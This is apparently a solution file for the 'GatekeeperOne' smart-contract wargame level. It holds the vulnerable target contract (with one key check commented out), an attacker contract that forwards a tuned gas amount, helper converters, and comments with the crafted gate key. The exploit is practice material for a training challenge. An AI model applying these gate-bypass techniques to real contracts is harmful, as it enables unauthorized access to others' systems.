// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "One");
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0, "Two");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      // require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}



// msg.sender - отправитель сообщения, адрес которого вызывает функцию
// tx.origin  - инициатор транзы, мб только кош, адрес который платит газ за выполнение транзы.
// gasleft - остаток газа

contract Enter{
    GatekeeperOne public target;

    constructor (address _addr) {
        target = GatekeeperOne(_addr);
    }


    function callEnter(bytes8 _gateKey) external {
        target.enter{gas: 24989}(_gateKey);
    }
}

// 0x1111111111111111
// 9584

// 416


contract Converter{
    function toUint16(address _addr) public pure returns (uint16){
        return uint16(uint160(_addr));
    }

    function toBytes8(uint64 _val) public pure returns(bytes8){
        return bytes8(_val);
    }

    function toUint32(uint64 _val) public pure returns(uint32){
        return uint32(_val);
    }

    function toUint64(bytes8 _val) public pure returns(uint64){
        return uint64(_val);
    }    
}

// 0x100000000000ddc4
